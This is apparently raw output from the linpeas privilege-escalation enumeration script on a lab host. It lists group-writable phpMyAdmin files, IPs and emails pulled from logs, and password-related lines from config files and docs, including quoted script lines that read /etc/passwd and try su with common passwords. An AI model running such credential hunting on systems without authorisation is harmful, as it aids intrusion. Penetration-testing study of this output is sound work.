+/usr/share/phpmyadmin/libraries/classes/Gis/GisMultiPolygon.php
+/usr/share/phpmyadmin/libraries/classes/Gis/GisPoint.php
+/usr/share/phpmyadmin/libraries/classes/Gis/GisPolygon.php
+/usr/share/phpmyadmin/libraries/classes/Gis/GisVisualization.php
+/usr/share/phpmyadmin/libraries/classes/Header.php
+/usr/share/phpmyadmin/libraries/classes/Import.php
+/usr/share/phpmyadmin/libraries/classes/Index.php
+/usr/share/phpmyadmin/libraries/classes/IndexColumn.php
+/usr/share/phpmyadmin/libraries/classes/InsertEdit.php
+/usr/share/phpmyadmin/libraries/classes/IpAllowDeny.php
+/usr/share/phpmyadmin/libraries/classes/Language.php
+/usr/share/phpmyadmin/libraries/classes/LanguageManager.php
+/usr/share/phpmyadmin/libraries/classes/Linter.php
+/usr/share/phpmyadmin/libraries/classes/ListAbstract.php
+#)You_can_write_even_more_files_inside_last_directory
+/usr/share/phpmyadmin/libraries/classes/Navigation/Navigation.php
+/usr/share/phpmyadmin/libraries/classes/Navigation/NavigationHeader.php
+/usr/share/phpmyadmin/libraries/classes/Navigation/NavigationTree.php
+/usr/share/phpmyadmin/libraries/classes/Navigation/NodeFactory.php
+/usr/share/phpmyadmin/libraries/classes/Navigation/Nodes
+/usr/share/phpmyadmin/libraries/classes/Navigation/Nodes/Node.php
+/usr/share/phpmyadmin/libraries/classes/Navigation/Nodes/NodeColumn.php
+/usr/share/phpmyadmin/libraries/classes/Navigation/Nodes/NodeColumnContainer.php
+/usr/share/phpmyadmin/libraries/classes/Navigation/Nodes/NodeDatabase.php
+/usr/share/phpmyadmin/libraries/classes/Navigation/Nodes/NodeDatabaseChild.php
+/usr/share/phpmyadmin/libraries/classes/Navigation/Nodes/NodeDatabaseChildContainer.php
+/usr/share/phpmyadmin/libraries/classes/Navigation/Nodes/NodeDatabaseContainer.php
+/usr/share/phpmyadmin/libraries/classes/Navigation/Nodes/NodeEvent.php
+/usr/share/phpmyadmin/libraries/classes/Navigation/Nodes/NodeEventContainer.php
+/usr/share/phpmyadmin/libraries/classes/Navigation/Nodes/NodeFunction.php
+#)You_can_write_even_more_files_inside_last_directory
+/usr/share/phpmyadmin/libraries/classes/Normalization.php
+/usr/share/phpmyadmin/libraries/classes/OpenDocument.php
+/usr/share/phpmyadmin/libraries/classes/Operations.php
+/usr/share/phpmyadmin/libraries/classes/OutputBuffering.php
+/usr/share/phpmyadmin/libraries/classes/ParseAnalyze.php
+/usr/share/phpmyadmin/libraries/classes/Partition.php
+/usr/share/phpmyadmin/libraries/classes/Pdf.php
+/usr/share/phpmyadmin/libraries/classes/Plugins
+/usr/share/phpmyadmin/libraries/classes/Plugins.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Auth
+/usr/share/phpmyadmin/libraries/classes/Plugins/Auth/AuthenticationConfig.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Auth/AuthenticationCookie.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Auth/AuthenticationHttp.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Auth/AuthenticationSignon.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/AuthenticationPlugin.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Export
+/usr/share/phpmyadmin/libraries/classes/Plugins/Export/ExportCodegen.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Export/ExportCsv.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Export/ExportExcel.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Export/ExportHtmlword.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Export/ExportJson.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Export/ExportLatex.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Export/ExportMediawiki.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Export/ExportOds.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Export/ExportOdt.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Export/ExportPdf.php
+#)You_can_write_even_more_files_inside_last_directory
+/usr/share/phpmyadmin/libraries/classes/Plugins/Export/Helpers/Pdf.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Export/Helpers/TableProperty.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Export/README
+/usr/share/phpmyadmin/libraries/classes/Plugins/ExportPlugin.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/IOTransformationsPlugin.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Import
+/usr/share/phpmyadmin/libraries/classes/Plugins/Import/AbstractImportCsv.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Import/ImportCsv.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Import/ImportLdi.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Import/ImportMediawiki.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Import/ImportOds.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Import/ImportShp.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Import/ImportSql.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Import/ImportXml.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Import/README
+/usr/share/phpmyadmin/libraries/classes/Plugins/Import/ShapeFileImport.php
+#)You_can_write_even_more_files_inside_last_directory
+/usr/share/phpmyadmin/libraries/classes/Plugins/Import/Upload/UploadApc.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Import/Upload/UploadNoplugin.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Import/Upload/UploadProgress.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Import/Upload/UploadSession.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/ImportPlugin.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Schema
+/usr/share/phpmyadmin/libraries/classes/Plugins/Schema/Dia
+/usr/share/phpmyadmin/libraries/classes/Plugins/Schema/Dia/Dia.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Schema/Dia/DiaRelationSchema.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Schema/Dia/RelationStatsDia.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Schema/Dia/TableStatsDia.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Schema/Eps
+/usr/share/phpmyadmin/libraries/classes/Plugins/Schema/Eps/Eps.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Schema/Eps/EpsRelationSchema.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Schema/Eps/RelationStatsEps.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Schema/Eps/TableStatsEps.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Schema/ExportRelationSchema.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Schema/Pdf
+/usr/share/phpmyadmin/libraries/classes/Plugins/Schema/Pdf/Pdf.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Schema/Pdf/PdfRelationSchema.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Schema/Pdf/RelationStatsPdf.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Schema/Pdf/TableStatsPdf.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Schema/RelationStats.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Schema/SchemaDia.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Schema/SchemaEps.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Schema/SchemaPdf.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Schema/SchemaSvg.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Schema/Svg
+/usr/share/phpmyadmin/libraries/classes/Plugins/Schema/Svg/RelationStatsSvg.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Schema/Svg/Svg.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Schema/Svg/SvgRelationSchema.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Schema/Svg/TableStatsSvg.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Schema/TableStats.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/SchemaPlugin.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Abs
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Abs/Bool2TextTransformationsPlugin.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Abs/CodeMirrorEditorTransformationPlugin.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Abs/DateFormatTransformationsPlugin.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Abs/DownloadTransformationsPlugin.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Abs/ExternalTransformationsPlugin.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Abs/FormattedTransformationsPlugin.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Abs/HexTransformationsPlugin.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Abs/ImageLinkTransformationsPlugin.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Abs/ImageUploadTransformationsPlugin.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Abs/InlineTransformationsPlugin.php
+#)You_can_write_even_more_files_inside_last_directory
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Input
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Input/Image_JPEG_Upload.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Input/Text_Plain_FileUpload.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Input/Text_Plain_Iptobinary.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Input/Text_Plain_JsonEditor.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Input/Text_Plain_RegexValidation.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Input/Text_Plain_SqlEditor.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Input/Text_Plain_XmlEditor.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Output
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Output/Application_Octetstream_Download.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Output/Application_Octetstream_Hex.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Output/Image_JPEG_Inline.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Output/Image_JPEG_Link.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Output/Image_PNG_Inline.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Output/Text_Octetstream_Sql.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Output/Text_Plain_Binarytoip.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Output/Text_Plain_Bool2Text.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Output/Text_Plain_Dateformat.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Output/Text_Plain_External.php
+#)You_can_write_even_more_files_inside_last_directory
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/README
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/TEMPLATE
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/TEMPLATE_ABSTRACT
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Text_Plain_Link.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Text_Plain_Longtoipv4.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Text_Plain_PreApPend.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/Transformations/Text_Plain_Substring.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/TransformationsInterface.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/TransformationsPlugin.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/TwoFactor
+/usr/share/phpmyadmin/libraries/classes/Plugins/TwoFactor/Application.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/TwoFactor/Invalid.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/TwoFactor/Key.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/TwoFactor/Simple.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/TwoFactorPlugin.php
+/usr/share/phpmyadmin/libraries/classes/Plugins/UploadInterface.php
+/usr/share/phpmyadmin/libraries/classes/Properties
+/usr/share/phpmyadmin/libraries/classes/Properties/Options
+/usr/share/phpmyadmin/libraries/classes/Properties/Options/Groups
+/usr/share/phpmyadmin/libraries/classes/Properties/Options/Groups/OptionsPropertyMainGroup.php
+/usr/share/phpmyadmin/libraries/classes/Properties/Options/Groups/OptionsPropertyRootGroup.php
+/usr/share/phpmyadmin/libraries/classes/Properties/Options/Groups/OptionsPropertySubgroup.php
+/usr/share/phpmyadmin/libraries/classes/Properties/Options/Items
+/usr/share/phpmyadmin/libraries/classes/Properties/Options/Items/BoolPropertyItem.php
+/usr/share/phpmyadmin/libraries/classes/Properties/Options/Items/DocPropertyItem.php
+/usr/share/phpmyadmin/libraries/classes/Properties/Options/Items/HiddenPropertyItem.php
+/usr/share/phpmyadmin/libraries/classes/Properties/Options/Items/MessageOnlyPropertyItem.php
+
+[+] Interesting GROUP writable files (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+  Group www-data:
+
+
+[+] Searching passwords in config PHP files
+
+[+] Finding IPs inside logs (limit 70)
+     95 /var/log/dpkg.log:2.7.6.1
+      8 /var/log/dpkg.log:4.8.1.1
+      8 /var/log/dpkg.log:1.7.3.1
+      4 /var/log/installer/status:1.2.3.3
+      3 /var/log/wtmp:172.16.204.1
+      2 /var/log/vmware-vmsvc.log:10.1.5.59
+      1 /var/log/lastlog:172.16.204.1
+      1 /var/log/apt/history.log:2.7.6.1
+      1 /var/log/apt/history.log:1.7.3.1
+
+[+] Finding passwords inside logs (limit 70)
+/var/log/dpkg.log:2019-03-02 13:48:58 configure base-passwd:amd64 3.5.43 3.5.43
+/var/log/dpkg.log:2019-03-02 13:48:58 install base-passwd:amd64 <none> 3.5.43
+/var/log/dpkg.log:2019-03-02 13:48:58 status half-configured base-passwd:amd64 3.5.43
+/var/log/dpkg.log:2019-03-02 13:48:58 status half-installed base-passwd:amd64 3.5.43
+/var/log/dpkg.log:2019-03-02 13:48:58 status installed base-passwd:amd64 3.5.43
+/var/log/dpkg.log:2019-03-02 13:48:58 status unpacked base-passwd:amd64 3.5.43
+/var/log/dpkg.log:2019-03-02 13:49:01 status half-configured base-passwd:amd64 3.5.43
+/var/log/dpkg.log:2019-03-02 13:49:01 status half-installed base-passwd:amd64 3.5.43
+/var/log/dpkg.log:2019-03-02 13:49:01 status unpacked base-passwd:amd64 3.5.43
+/var/log/dpkg.log:2019-03-02 13:49:01 upgrade base-passwd:amd64 3.5.43 3.5.43
+/var/log/dpkg.log:2019-03-02 13:49:04 install passwd:amd64 <none> 1:4.4-4.1
+/var/log/dpkg.log:2019-03-02 13:49:04 status half-installed passwd:amd64 1:4.4-4.1
+/var/log/dpkg.log:2019-03-02 13:49:04 status unpacked passwd:amd64 1:4.4-4.1
+/var/log/dpkg.log:2019-03-02 13:49:05 configure base-passwd:amd64 3.5.43 <none>
+/var/log/dpkg.log:2019-03-02 13:49:05 status half-configured base-passwd:amd64 3.5.43
+/var/log/dpkg.log:2019-03-02 13:49:05 status unpacked base-passwd:amd64 3.5.43
+/var/log/dpkg.log:2019-03-02 13:49:06 configure passwd:amd64 1:4.4-4.1 <none>
+/var/log/dpkg.log:2019-03-02 13:49:06 status half-configured passwd:amd64 1:4.4-4.1
+/var/log/dpkg.log:2019-03-02 13:49:06 status installed base-passwd:amd64 3.5.43
+/var/log/dpkg.log:2019-03-02 13:49:06 status installed passwd:amd64 1:4.4-4.1
+/var/log/dpkg.log:2019-03-02 13:49:06 status unpacked passwd:amd64 1:4.4-4.1
+/var/log/installer/status:Description: Set up users and passwords
+
+[+] Finding emails inside logs (limit 70)
+     41 /var/log/installer/status:debian-boot@lists.debian.org
+     15 /var/log/installer/status:debian-kernel@lists.debian.org
+      4 /var/log/installer/status:gcs@debian.org
+      2 /var/log/installer/status:pkg-lvm-maintainers@lists.alioth.debian.org
+      2 /var/log/installer/status:pkg-iscsi-maintainers@lists.alioth.debian.org
+      2 /var/log/installer/status:pkg-gnupg-maint@lists.alioth.debian.org
+      2 /var/log/installer/status:parted-maintainers@lists.alioth.debian.org
+      2 /var/log/installer/status:mmind@debian.org
+      2 /var/log/installer/status:berni@debian.org
+      1 /var/log/installer/status:xnox@debian.org
+      1 /var/log/installer/status:tytso@mit.edu
+      1 /var/log/installer/status:rogershimizu@gmail.com
+      1 /var/log/installer/status:pkg-wpa-devel@lists.alioth.debian.org
+      1 /var/log/installer/status:pkg-openssl-devel@lists.alioth.debian.org
+      1 /var/log/installer/status:pkg-mdadm-devel@lists.alioth.debian.org
+      1 /var/log/installer/status:pkg-grub-devel@lists.alioth.debian.org
+      1 /var/log/installer/status:pkg-gnutls-maint@lists.alioth.debian.org
+      1 /var/log/installer/status:petere@debian.org
+      1 /var/log/installer/status:packages@release.debian.org
+      1 /var/log/installer/status:linux-xfs@vger.kernel.org
+      1 /var/log/installer/status:guus@debian.org
+      1 /var/log/installer/status:guillem@debian.org
+      1 /var/log/installer/status:djpig@debian.org
+      1 /var/log/installer/status:anibal@debian.org
+      1 /var/log/installer/status:ah-util-linux@debian.org
+      1 /var/log/installer/status:aeb@debian.org
+
+[+] Finding *password* or *credential* files in home (limit 70)
+
+[+] Finding 'pwd' or 'passw' variables (and interesting php db definitions) inside key folders (limit 70)
+/etc/bash_completion.d/grub:__grub_mkpasswd_pbkdf2_program="grub-mkpasswd-pbkdf2"
+/etc/nsswitch.conf:passwd:         compat
+/etc/pam.d/common-password:password	[success=1 default=ignore]	pam_unix.so obscure sha512
+/etc/security/namespace.init:                gid=$(echo "$passwd" | cut -f4 -d":")
+/etc/security/namespace.init:        homedir=$(echo "$passwd" | cut -f6 -d":")
+/etc/security/namespace.init:        passwd=$(getent passwd "$user")
+/etc/ssl/openssl.cnf:challengePassword		= A challenge password
+/etc/ssl/openssl.cnf:challengePassword_max		= 20
+/etc/ssl/openssl.cnf:challengePassword_min		= 4
+/etc/vmware-tools/vm-support:         sed 's/password[[:space:]]\+\(.*\)[[:space:]]\+\(.*\)$/password \1 xxxxxx/g' > \
+/tmp/linpeas.sh:      SHELLUSERS=`cat /etc/passwd 2>/dev/null | grep -i "sh$" | cut -d ":" -f 1`
+/tmp/linpeas.sh:    P)  PASSWORD=$OPTARG;;
+/tmp/linpeas.sh:    echo "  You can login as $USER using password: $PASSWORDTRY" | sed -E "s,.*,${C}[1;31;103m&${C}[0m,"
+/tmp/linpeas.sh:    printf $Y"[+] "$GREEN"Testing 'su' as other users with shell using as passwords: null pwd, the username and top2000pwds\n"$NC
+/tmp/linpeas.sh:  FIND_PASSWORD_RELEVANT_NAMES=$(prep_to_find "$PASSWORD_RELEVANT_NAMES")
+/tmp/linpeas.sh:  PASSWORDTRY=$2
+/tmp/linpeas.sh:  PASSWORD_RELEVANT_NAMES="*password* *credential* creds*"
+/tmp/linpeas.sh:PASSWORD=""
+/tmp/linpeas.sh:processesDump="gdm-password|gnome-keyring-daemon|lightdm|vsftpd|apache2|sshd:"
+/tmp/lse.sh:    'for u in $(cut -d: -f 1 /etc/passwd); do [ "$u" != "$lse_user" ] && crontab -l -u "$u"; done'
+/tmp/lse.sh:    'for u in $(cut -d: -f1 /etc/passwd); do [ $(id -u $u) = 0 ] && echo $u; done | grep -v root'
+/tmp/lse.sh:    'grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab'
+/tmp/lse.sh:  cecho "${lblue}    Password:${reset} "
+/tmp/lse.sh:[ -z "$lse_home" ] && lse_home="`(grep -E "^$lse_user:" /etc/passwd | cut -d: -f6)2>/dev/null`"
+/var/backups/dpkg.status.0:Depends: passwd, debconf (>= 0.5) | debconf-2.0
+/var/backups/dpkg.status.0:Depends: passwd, libc6 (>= 2.4)
+/var/www/html/phpmyadmin/config.sample.inc.php:$cfg['Servers'][$i]['AllowNoPassword'] = false;
+/var/www/html/phpmyadmin/doc/html/_sources/config.txt:        $cfg['Servers'][$i]['password'] = 'yourpassword';
+/var/www/html/phpmyadmin/doc/html/_sources/config.txt:      way: username and password are stored in :file:`config.inc.php`.
+/var/www/html/phpmyadmin/doc/html/_sources/faq.txt:``https://example.com/phpmyadmin/?pma_username=user&pma_password=password``.
+/var/www/html/phpmyadmin/doc/html/_sources/setup.txt:    $cfg['Servers'][$i]['password']      = 'cbb74bc'; // use here your password
+/var/www/html/phpmyadmin/doc/html/_sources/setup.txt:    // $cfg['Servers'][$i]['AllowNoPassword'] = true; `
+/var/www/html/phpmyadmin/doc/html/_sources/setup.txt:    Password to use for :ref:`auth_config`.
+/var/www/html/phpmyadmin/doc/html/_sources/setup.txt::envvar:`PMA_PASSWORD` are set, it is switched to :ref:`auth_config`.
+/var/www/html/phpmyadmin/doc/html/_sources/setup.txt:user/password fields inside the :config:option:`$cfg['Servers']`.
+/var/www/html/phpmyadmin/doc/html/_static/jquery.js:		password: null,
+/var/www/html/phpmyadmin/doc/html/_static/jquery.js:for ( i in { radio: true, checkbox: true, file: true, password: true, image: true } ) {
+/var/www/html/phpmyadmin/doc/html/config.html:<span class="target" id="servers-nopassword"></span><dl class="option">
+/var/www/html/phpmyadmin/doc/html/config.html:for a password when accessing remotely, you can achieve it using following snippet:</p>
+/var/www/html/phpmyadmin/doc/html/setup.html:      <span class="p p-Indicator">-</span> <span class="l l-Scalar l-Scalar-Plain">PMA_PASSWORD=</span>
+/var/www/html/phpmyadmin/doc/html/setup.html:<span class="c1">// if you insist on &quot;root&quot; having no password:</span>
+/var/www/html/phpmyadmin/doc/html/setup.html:can authenticate. This can be done using the <strong class="program">htpasswd</strong> utility:</p>
+/var/www/html/phpmyadmin/examples/config.manyhosts.inc.php:    $cfg['Servers'][$i]['password'] = '';
+/var/www/html/phpmyadmin/examples/openid.php:        $_SESSION['PMA_single_signon_password'] = $AUTH_MAP[$id]['password'];
+/var/www/html/phpmyadmin/examples/openid.php:        'password' => '',
+/var/www/html/phpmyadmin/examples/signon.php:    $_SESSION['PMA_single_signon_password'] = $_POST['password'];
+/var/www/html/phpmyadmin/examples/signon.php:    Password: <input type="password" name="password" /><br />
+/var/www/html/phpmyadmin/js/doclinks.js:    'OLD_PASSWORD': Array('encryption-functions', 'function_old_password'),
+/var/www/html/phpmyadmin/js/doclinks.js:    'PASSWORD': Array('encryption-functions', 'function_password'),
+/var/www/html/phpmyadmin/js/functions.js:        .attr({ type: 'button', id: 'button_generate_password', value: PMA_messages.strGenerate })
+/var/www/html/phpmyadmin/js/functions.js:        .html(PMA_messages.strGeneratePassword + ':')
+/var/www/html/phpmyadmin/js/functions.js:        passwd.value += pwchars.charAt(Math.abs(randomWords[i]) % pwchars.length);
+/var/www/html/phpmyadmin/js/functions.js:    $jquery_passwd_form = $(passwd_form);
+/var/www/html/phpmyadmin/js/functions.js:    if ($password.val() === '') {
+/var/www/html/phpmyadmin/js/functions.js:    meter_obj = $jquery_passwd_form.find('meter[name="pw_meter"]').first();
+/var/www/html/phpmyadmin/js/functions.js:    meter_obj_label = $jquery_passwd_form.find('span[name="pw_strength"]').first();
+/var/www/html/phpmyadmin/js/functions.js:    passwd.value = '';
+/var/www/html/phpmyadmin/js/functions.js:    passwd_form.elements.pma_pw.value = passwd.value;
+/var/www/html/phpmyadmin/js/functions.js:    passwd_form.elements.pma_pw2.value = passwd.value;
+/var/www/html/phpmyadmin/js/functions.js:    var $password = $the_form.find('input[name=pma_pw]');
+/var/www/html/phpmyadmin/js/functions.js:    var $password_repeat = $the_form.find('input[name=pma_pw2]');
+/var/www/html/phpmyadmin/js/functions.js:    var generatePwdDiv = $('<div />').addClass('item');
+/var/www/html/phpmyadmin/js/functions.js:    var generatePwdRow = $('<tr />').addClass('vmiddle');
+/var/www/html/phpmyadmin/js/functions.js:    var passwd = passwd_form.generated_pw;
+/var/www/html/phpmyadmin/js/functions.js:    var passwordlength = 16;    // do we want that to be dynamic?  no, keep it simple :)
+/var/www/html/phpmyadmin/js/functions.js:    var pwdButton = $('<input />')
+/var/www/html/phpmyadmin/js/functions.js:    var pwdCell = $('<td />').appendTo(generatePwdRow);
+/var/www/html/phpmyadmin/js/functions.js:    var pwdTextbox = $('<input />')
+/var/www/html/phpmyadmin/js/functions.js:    } else if ($password.val() !== $password_repeat.val()) {
+/var/www/html/phpmyadmin/js/messages.php:$js_messages['strChangePassword'] = __('Change password');
+
+[+] Finding possible password variables inside key folders (limit 70)
+/var/www/htm
+/var/www/html/phpmyadmin/doc/html/_sources/setup.txt:``--link your_db_host:db``) or by environment variables (in this case it's up
+/var/www/html/phpmyadmin/doc/html/bookmarks.html:             accesskey="I">index</a></li>
+/var/www/html/phpmyadmin/doc/html/bookmarks.html:             accesskey="N">next</a> |</li>
+/var/www/html/phpmyadmin/doc/html/bookmarks.html:             accesskey="P">previous</a> |</li>
+/var/www/html/phpmyadmin/doc/html/charts.html:             accesskey="I">index</a></li>
+/var/www/html/phpmyadmin/doc/html/charts.html:             accesskey="N">next</a> |</li>
+/var/www/html/phpmyadmin/doc/html/charts.html:             accesskey="P">previous</a> |</li>
+/var/www/html/phpmyadmin/doc/html/config.html:             accesskey="I">index</a></li>
+/var/www/html/phpmyadmin/doc/html/config.html:             accesskey="N">next</a> |</li>
+/var/www/html/phpmyadmin/doc/html/config.html:             accesskey="P">previous</a> |</li>
+/var/www/html/phpmyadmin/doc/html/copyright.html:             accesskey="I">index</a></li>
+/var/www/html/phpmyadmin/doc/html/copyright.html:             accesskey="N">next</a> |</li>
+/var/www/html/phpmyadmin/doc/html/copyright.html:             accesskey="P">previous</a> |</li>
+/var/www/html/phpmyadmin/doc/html/credits.html:             accesskey="I">index</a></li>
+/var/www/html/phpmyadmin/doc/html/credits.html:             accesskey="N">next</a> |</li>
+/var/www/html/phpmyadmin/doc/html/credits.html:             accesskey="P">previous</a> |</li>
+/var/www/html/phpmyadmin/doc/html/developers.html:             accesskey="I">index</a></li>
+/var/www/html/phpmyadmin/doc/html/developers.html:             accesskey="N">next</a> |</li>
+/var/www/html/phpmyadmin/doc/html/developers.html:             accesskey="P">previous</a> |</li>
+/var/www/html/phpmyadmin/doc/html/faq.html:             accesskey="I">index</a></li>
+/var/www/html/phpmyadmin/doc/html/faq.html:             accesskey="N">next</a> |</li>
+/var/www/html/phpmyadmin/doc/html/faq.html:             accesskey="P">previous</a> |</li>
+/var/www/html/phpmyadmin/doc/html/genindex.html:             accesskey="I">index</a></li>
+/var/www/html/phpmyadmin/doc/html/glossary.html:             accesskey="I">index</a></li>
+/var/www/html/phpmyadmin/doc/html/glossary.html:             accesskey="P">previous</a> |</li>
+/var/www/html/phpmyadmin/doc/html/import_export.html:             accesskey="I">index</a></li>
+/var/www/html/phpmyadmin/doc/html/import_export.html:             accesskey="N">next</a> |</li>
+/var/www/html/phpmyadmin/doc/html/import_export.html:             accesskey="P">previous</a> |</li>
+/var/www/html/phpmyadmin/doc/html/index.html:             accesskey="I">index</a></li>
+/var/www/html/phpmyadmin/doc/html/index.html:             accesskey="N">next</a> |</li>
+/var/www/html/phpmyadmin/doc/html/intro.html:             accesskey="I">index</a></li>
+/var/www/html/phpmyadmin/doc/html/intro.html:             accesskey="N">next</a> |</li>
+/var/www/html/phpmyadmin/doc/html/intro.html:             accesskey="P">previous</a> |</li>
+/var/www/html/phpmyadmin/doc/html/other.html:             accesskey="I">index</a></li>
+/var/www/html/phpmyadmin/doc/html/other.html:             accesskey="N">next</a> |</li>
+/var/www/html/phpmyadmin/doc/html/other.html:             accesskey="P">previous</a> |</li>
+/var/www/html/phpmyadmin/doc/html/privileges.html:             accesskey="I">index</a></li>
+/var/www/html/phpmyadmin/doc/html/privileges.html:             accesskey="N">next</a> |</li>
+/var/www/html/phpmyadmin/doc/html/privileges.html:             accesskey="P">previous</a> |</li>
+/var/www/html/phpmyadmin/doc/html/relations.html:             accesskey="I">index</a></li>
+/var/www/html/phpmyadmin/doc/html/relations.html:             accesskey="N">next</a> |</li>
+/var/www/html/phpmyadmin/doc/html/relations.html:             accesskey="P">previous</a> |</li>
+/var/www/html/phpmyadmin/doc/html/require.html:             accesskey="I">index</a></li>
+/var/www/html/phpmyadmin/doc/html/require.html:             accesskey="N">next</a> |</li>
+/var/www/html/phpmyadmin/doc/html/require.html:             accesskey="P">previous</a> |</li>
+/var/www/html/phpmyadmin/doc/html/search.html:             accesskey="I">index</a></li>
+/var/www/html/phpmyadmin/doc/html/security.html:             accesskey="I">index</a></li>
+/var/www/html/phpmyadmin/doc/html/security.html:             accesskey="N">next</a> |</li>
+/var/www/html/phpmyadmin/doc/html/security.html:             accesskey="P">previous</a> |</li>
+/var/www/html/phpmyadmin/doc/html/settings.html:             accesskey="I">index</a></li>
+/var/www/html/phpmyadmin/doc/html/settings.html:             accesskey="N">next</a> |</li>
+/var/www/html/phpmyadmin/doc/html/settings.html:             accesskey="P">previous</a> |</li>
+/var/www/html/phpmyadmin/doc/html/setup.html:             accesskey="I">index</a></li>
+/var/www/html/phpmyadmin/doc/html/setup.html:             accesskey="N">next</a> |</li>
+/var/www/html/phpmyadmin/doc/html/setup.html:             accesskey="P">previous</a> |</li>
+/var/www/html/phpmyadmin/doc/html/themes.html:             accesskey="I">index</a></li>
